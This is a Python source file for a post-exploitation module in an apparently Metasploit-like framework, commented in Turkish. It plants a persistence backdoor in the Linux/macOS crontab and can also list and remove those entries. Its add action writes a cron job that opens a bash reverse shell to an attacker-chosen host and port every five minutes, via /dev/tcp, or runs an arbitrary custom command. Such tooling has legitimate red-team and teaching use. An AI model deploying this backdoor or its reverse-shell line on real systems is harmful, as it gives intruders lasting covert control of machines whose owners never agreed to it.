# =============================================================================
# Post-Exploitation: Cron Backdoor (Persistence)
# =============================================================================
# Linux/macOS crontab üzerinden kalıcılık (persistence) sağlayan modül.
#
# KULLANIM:
#   1. use post/persist/cron_backdoor
#   2. set ACTION list                  # mevcut cron job'ları listele
#   3. run
#
#   4. set ACTION add
#   5. set LHOST 10.0.0.1
#   6. set LPORT 4444
#   7. set SCHEDULE "*/5 * * * *"       # her 5 dakikada bir
#   8. set PAYLOAD_TYPE reverse_bash    # veya custom
#   9. run
#
#  10. set ACTION remove
#  11. run                               # eklenen cron satırını kaldırır
# =============================================================================

import subprocess
from typing import Any

from rich import print
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

from core import logger
from core.module import BaseModule
from core.option import Option

# Modülün eklediği satırları işaretlemek için kullanılan yorum etiketi
_MARKER = "# MAH-PERSIST"


class cron_backdoor(BaseModule):
    """Cron Tabanlı Kalıcılık Modülü (Post-Exploitation)

    Hedef Linux/macOS sisteminde crontab'a zamanlanmış görev ekleyerek
    kalıcılık (persistence) sağlar. Eklenen girdi, belirli aralıklarla
    reverse shell veya özel komut çalıştırır.

    Desteklenen İşlemler:
        - **list** : Mevcut kullanıcı crontab'ını listeler.
        - **add**  : Yeni cron job ekler (reverse_bash veya custom komut).
        - **remove**: Bu modül tarafından eklenen job'ları kaldırır.
    """

    # ── META ──────────────────────────────────────────────────────────────────
    Name = "Cron Backdoor"
    Description = "Crontab üzerinden kalıcılık (persistence) sağlama modülü"
    Author = "Mahmut P."
    Category = "post/persist"
    Version = "1.0"

    Requirements: dict[str, list[str]] = {}

    def __init__(self):
        super().__init__()
        self.Options = {
            "ACTION": Option(
                name="ACTION",
                value="list",
                required=True,
                description="Yapılacak işlem: list / add / remove",
                choices=["list", "add", "remove"],
            ),
            "LHOST": Option(
                name="LHOST",
                value="",
                required=False,
                description="Reverse shell geri bağlantı adresi (add için gerekli)",
            ),
            "LPORT": Option(
                name="LPORT",
                value=4444,
                required=False,
                description="Reverse shell geri bağlantı portu",
                regex_check=True,
                regex=r"^\d+$",
            ),
            "SCHEDULE": Option(
                name="SCHEDULE",
                value="*/5 * * * *",
                required=False,
                description="Cron zamanlama ifadesi (add için)",
            ),
            "PAYLOAD_TYPE": Option(
                name="PAYLOAD_TYPE",
                value="reverse_bash",
                required=False,
                description="Payload tipi: reverse_bash veya custom",
                choices=["reverse_bash", "custom"],
            ),
            "PAYLOAD_CMD": Option(
                name="PAYLOAD_CMD",
                value="",
                required=False,
                description="PAYLOAD_TYPE=custom ise çalıştırılacak komut",
            ),
        }
        for opt_name, opt_obj in self.Options.items():
            setattr(self, opt_name, opt_obj.value)

        self.console = Console()

    # ── YARDIMCI ─────────────────────────────────────────────────────────────

    @staticmethod
    def _get_crontab() -> str | None:
        """Mevcut kullanıcı crontab içeriğini döner; yoksa None."""
        try:
            result = subprocess.run(
                ["crontab", "-l"],
                capture_output=True,
                text=True,
                timeout=10,
            )
            if result.returncode == 0:
                return result.stdout
            return None
        except Exception:
            return None

    @staticmethod
    def _set_crontab(content: str) -> bool:
        """Verilen içeriği crontab olarak yazar."""
        try:
            proc = subprocess.run(
                ["crontab", "-"],
                input=content,
                capture_output=True,
                text=True,
                timeout=10,
            )
            return proc.returncode == 0
        except Exception:
            return False

    def _build_payload_line(self, options: dict[str, Any]) -> str:
        """Crontab satırını oluşturur."""
        schedule = str(options.get("SCHEDULE", "*/5 * * * *"))
        payload_type = str(options.get("PAYLOAD_TYPE", "reverse_bash")).lower()

        if payload_type == "custom":
            cmd = str(options.get("PAYLOAD_CMD", ""))
            if not cmd:
                return ""
            return f"{schedule} {cmd} {_MARKER}"

        # reverse_bash
        lhost = str(options.get("LHOST", ""))
        lport = str(options.get("LPORT", "4444"))
        if not lhost:
            return ""
        return f"{schedule} /bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' {_MARKER}"

    # ── ACTIONS ──────────────────────────────────────────────────────────────

    def _action_list(self) -> bool:
        """Mevcut crontab girişlerini listeler."""
        raw = self._get_crontab()
        self.console.print()
        if raw is None or raw.strip() == "":
            self.console.print(
                "[yellow][!] Mevcut crontab boş veya erişilemez.[/yellow]"
            )
            return True

        lines = [line for line in raw.splitlines() if line.strip()]
        tbl = Table(title="📋 Mevcut Crontab Girişleri", border_style="blue")
        tbl.add_column("#", style="dim", justify="right")
        tbl.add_column("Girdi", style="white")
        tbl.add_column("Kaynak", justify="center")

        for idx, line in enumerate(lines, 1):
            src = "[red]MAH[/red]" if _MARKER in line else "[dim]Sistem[/dim]"
            tbl.add_row(str(idx), line.replace(_MARKER, "").strip(), src)

        self.console.print(tbl)
        self.console.print(f"  [bold]Toplam:[/bold] {len(lines)} girdi")
        return True

    def _action_add(self, options: dict[str, Any]) -> bool:
        """Crontab'a yeni kalıcılık giridisi ekler."""
        new_line = self._build_payload_line(options)
        if not new_line:
            print(
                "[bold red][-] Payload oluşturulamadı. LHOST veya PAYLOAD_CMD kontrol edin.[/bold red]"
            )
            return False

        # Mevcut içerik
        current = self._get_crontab() or ""

        # Aynı satır zaten var mı?
        if _MARKER in current:
            print(
                "[yellow][!] Bu modül tarafından eklenmiş bir girdi zaten mevcut. "
                "Önce 'remove' ile kaldırın.[/yellow]"
            )
            return False

        new_content = current.rstrip("\n") + "\n" + new_line + "\n"
        if self._set_crontab(new_content):
            self.console.print(
                Panel(
                    f"[green]{new_line.replace(_MARKER, '').strip()}[/green]",
                    title="[bold green]✔ Cron Job Eklendi[/bold green]",
                    border_style="green",
                )
            )
            return True
        else:
            print("[bold red][-] Crontab yazılamadı.[/bold red]")
            return False

    def _action_remove(self) -> bool:
        """Bu modül tarafından eklenen cron satırlarını kaldırır."""
        current = self._get_crontab()
        if current is None or _MARKER not in current:
            print("[yellow][!] Kaldırılacak MAH girişi bulunamadı.[/yellow]")
            return True

        cleaned = (
            "\n".join(line for line in current.splitlines() if _MARKER not in line)
            + "\n"
        )

        if self._set_crontab(cleaned):
            print(
                "[bold green][+] MAH cron girişleri başarıyla kaldırıldı.[/bold green]"
            )
            return True
        else:
            print("[bold red][-] Crontab güncellenemedi.[/bold red]")
            return False

    # ── RUN ──────────────────────────────────────────────────────────────────

    def run(self, options: dict[str, Any]) -> bool:
        action = str(options.get("ACTION", "list")).lower()
        logger.info(f"Cron backdoor modülü çalıştırıldı (action={action})")

        self.console.print()
        self.console.print(
            Panel.fit(
                "[bold cyan]🕐 CRON BACKDOOR — Kalıcılık Modülü[/bold cyan]",
                border_style="cyan",
            )
        )

        if action == "list":
            return self._action_list()
        elif action == "add":
            return self._action_add(options)
        elif action == "remove":
            return self._action_remove()
        else:
            print(
                f"[bold red][-] Bilinmeyen action: {action}. "
                f"Geçerli değerler: list, add, remove[/bold red]"
            )
            return False
